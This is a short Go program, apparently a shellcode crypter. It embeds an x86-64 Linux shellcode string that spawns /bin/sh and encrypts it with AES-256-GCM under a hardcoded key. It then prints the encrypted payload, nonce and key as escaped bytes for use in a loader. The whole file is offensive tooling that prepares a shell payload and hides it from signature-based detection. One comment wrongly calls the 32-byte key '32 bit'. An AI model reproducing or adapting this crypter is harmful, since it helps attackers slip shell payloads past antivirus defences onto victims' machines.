package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
)

const shellcode = string("\x48\x31\xc0\x50\x49\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x57\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x8d\x57\x08\xb0\x3b\x0f\x05")
const EncryptionKey = "some32bitlong passphraseimusing "

func main() {

	block, _ := aes.NewCipher([]byte(EncryptionKey)) //Encryption Key = 32 bit ===> This create a AES 256 cipher for us to use
	aesgcm, _ := cipher.NewGCM(block)                //Cipher created and ready to use

	nonce := make([]byte, 12) // Generate the nonce to use for Galois Counter Mode
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	encrypted := aesgcm.Seal(nil, nonce, []byte(shellcode), nil) // Encrypt

	payload := hex.EncodeToString(encrypted)
	fmt.Print("Encrypted shellcode:   ")
	for i := 0; i < len(payload); i++ {
		fmt.Printf("\\x%x", payload[i])
	}

	encodedNonce := hex.EncodeToString(nonce)
	fmt.Print("\nNonce:   ")
	for i := 0; i < len(encodedNonce); i++ {
		fmt.Printf("\\x%x", encodedNonce[i])
	}

	fmt.Println("\nEncryption Key: ", EncryptionKey)
}
